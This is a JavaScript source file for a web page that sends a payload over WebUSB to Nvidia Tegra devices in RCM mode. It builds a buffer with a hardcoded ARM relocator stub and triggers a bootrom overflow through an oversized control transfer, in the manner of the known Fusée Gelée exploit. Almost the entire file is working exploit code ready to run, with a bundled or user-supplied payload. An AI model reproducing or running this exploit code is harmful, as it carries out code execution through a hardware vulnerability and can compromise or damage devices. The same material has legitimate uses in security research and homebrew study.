import {fusee} from "./fusee.bin.js";

"use strict";

(() => {
    const CONSTS = Object.freeze({
        CUSTOM: 'custom',
        EXAMPLE: 'example',
        WEBUSB_SUPPORTED: 'usb' in navigator,
        INTERMEZZO: new Uint8Array([
            0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
            0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
            0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
            0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
            0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
            0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
        ]),
        RCM_PAYLOAD_ADDRESS: 0x40010000,
        INTERMEZZO_LOCATION: 0x4001F000,
        PAYLOAD_LOAD_BLOCK: 0x40020000,
    })

    const ELEMENTS = Object.freeze({
        FORM: document.forms['payload-form'],
        CUSTOM_PAYLOAD: document.getElementById('custom-payload'),
        PAYLOAD_TYPE: document.forms['payload-form'].elements['payload-type'],
        RESULT: document.getElementById('result'),
        SUBMITBTN: document.getElementById('submit-button'),
        UPLOAD_PAYLOAD_OPTION: document.getElementById('upload-payload-option'),
        WEBUSB_NOT_SUPPORTED: document.getElementById('webusb-not-supported'),
        WINDOWS_UNSUPPORTED: document.getElementById('windows-not-supported'),
    })

    function logResult(...message) {
        ELEMENTS.RESULT.value += '## ' + message.join(' ') + '\n';
    }

    function clearResult() {
        ELEMENTS.RESULT.value = '';
    }

    function toggleSubmit() {
        ELEMENTS.SUBMITBTN.disabled = ELEMENTS.SUBMITBTN.disabled !== true;
    }

    function readFileAsArrayBuffer(file) {
        return new Promise((res) => {
            const reader = new FileReader();
            reader.onload = e => {
                res(e.target.result);
            }
            reader.readAsArrayBuffer(file);
        });
    }

    function createRCMPayload(intermezzo, payload) {
        const rcmLength = 0x30298;

        const intermezzoAddressRepeatCount = (CONSTS.INTERMEZZO_LOCATION - CONSTS.RCM_PAYLOAD_ADDRESS) / 4;

        const rcmPayloadSize = Math.ceil((0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000 + payload.byteLength) / 0x1000) * 0x1000;

        const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize))
        const rcmPayloadView = new DataView(rcmPayload.buffer);

        rcmPayloadView.setUint32(0x0, rcmLength, true);

        for (let i = 0; i < intermezzoAddressRepeatCount; i++) {
            rcmPayloadView.setUint32(0x2A8 + i * 4, CONSTS.INTERMEZZO_LOCATION, true);
        }

        rcmPayload.set(intermezzo, 0x2A8 + (0x4 * intermezzoAddressRepeatCount));
        rcmPayload.set(payload, 0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000);

        return rcmPayload;
    }

    function bufferToHex(data) {
        let result = "";
        for (let i = 0; i < data.byteLength; i++) {
            result += data.getUint8(i).toString(16).padStart(2, "0");
        }
        return result;
    }

    async function write(device, data) {
        let length = data.length;
        let writeCount = 0;
        const packetSize = 0x1000;

        while (length) {
            const dataToTransmit = Math.min(length, packetSize);
            length -= dataToTransmit;

            const chunk = data.slice(0, dataToTransmit);
            data = data.slice(dataToTransmit);
            await device.transferOut(1, chunk);
            writeCount++;
        }

        return writeCount;
    }

    async function launchPayload(device, payload) {
        logResult('Opening device - reboot your console if this hangs here.')
        await device.open();

        try {
            await device.selectConfiguration(1);
        } catch (e) {
            // ignore
        }
        await device.claimInterface(0);

        const deviceID = await device.transferIn(1, 16);
        logResult(`Device ID: ${bufferToHex(deviceID.data)}`);

        const rcmPayload = createRCMPayload(CONSTS.INTERMEZZO, payload);
        logResult("Sending payload...");
        const writeCount = await write(device, rcmPayload);
        logResult("Payload sent!");

        if (writeCount % 2 !== 1) {
            logResult("Switching to higher buffer...");
            await device.transferOut(1, new ArrayBuffer(0x1000));
        }

        logResult("Trigging vulnerability...");
        const vulnerabilityLength = 0x7000;
        device.controlTransferIn({
            requestType: 'standard',
            recipient: 'interface',
            request: 0x00,
            value: 0x00,
            index: 0x00
        }, vulnerabilityLength);
    }

    async function submitForm(event) {
        event.preventDefault();
        toggleSubmit();
        clearResult();

        const payloadType = ELEMENTS.PAYLOAD_TYPE.value;

        let payload;
        if (payloadType === CONSTS.CUSTOM) {
            const file = ELEMENTS.CUSTOM_PAYLOAD.files[0];
            if (file === undefined) {
                window.alert('Please choose a payload.');
                toggleSubmit();
                logResult('User did not choose a payload.')
                return;
            }
            payload = new Uint8Array(await readFileAsArrayBuffer(file));
        } else {
            payload = fusee;
        }

        logResult(`Will inject ${payloadType} payload.`)

        logResult('Requesting device access...')
        let device;

        try {
            device = await navigator.usb.requestDevice({filters: [{vendorId: 0x0955}]});
        } catch (e) {
            logResult(e);
        }

        if (device === undefined) {
            logResult('Aborting.')
            toggleSubmit();
            return;
        }

        logResult(`Selected '${device.productName}' by ${device.manufacturerName}`)

        try {
            await launchPayload(device, payload);
        } catch (e) {
            logResult(e);
        }

        device.close();
        toggleSubmit();
    }

    //-- Init --//
    ELEMENTS.FORM.addEventListener('submit', submitForm);
    ELEMENTS.CUSTOM_PAYLOAD.addEventListener('change', () => {
        ELEMENTS.PAYLOAD_TYPE.value = CONSTS.CUSTOM;
    });

    if (navigator.userAgentData.platform === 'Windows') {
        ELEMENTS.WINDOWS_UNSUPPORTED.classList.remove('d-none');
    }

    if (CONSTS.WEBUSB_SUPPORTED) {
        toggleSubmit();
    } else {
        ELEMENTS.WEBUSB_NOT_SUPPORTED.classList.remove('d-none');
    }

})();
